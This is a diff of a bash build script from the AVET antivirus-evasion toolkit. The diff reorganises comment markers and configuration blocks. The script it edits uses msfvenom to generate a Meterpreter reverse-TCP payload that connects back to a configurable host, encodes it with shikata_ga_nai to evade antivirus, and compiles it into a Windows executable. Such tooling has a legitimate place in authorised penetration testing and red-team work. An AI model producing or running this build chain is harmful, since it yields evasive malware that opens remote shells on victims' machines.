@@ -1,5 +1,10 @@
 #!/bin/bash          
+
+
+#DESCRIPTION_START
 # Use AVET encoding.
+#DESCRIPTION_END
+
 
 # print AVET logo
 cat banner.txt
@@ -15,9 +20,15 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# enable debug output
+enable_debug_print
+#CONFIGURATION_END
+
 
 # make meterpreter reverse payload, encoded with shikata_ga_nai
 msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt
@@ -43,12 +54,14 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode
 
-# enable debug output
-enable_debug_print
-
 # compile to exe file
 $win32_compiler -o output/hasvmmac_revtcp_win32.exe source/avet.c -lws2_32 -liphlpapi
 strip output/hasvmmac_revtcp_win32.exe
 
 # cleanup
 cleanup_techniques
+
+
+#USAGE_START
+TODO
+#USAGE_END
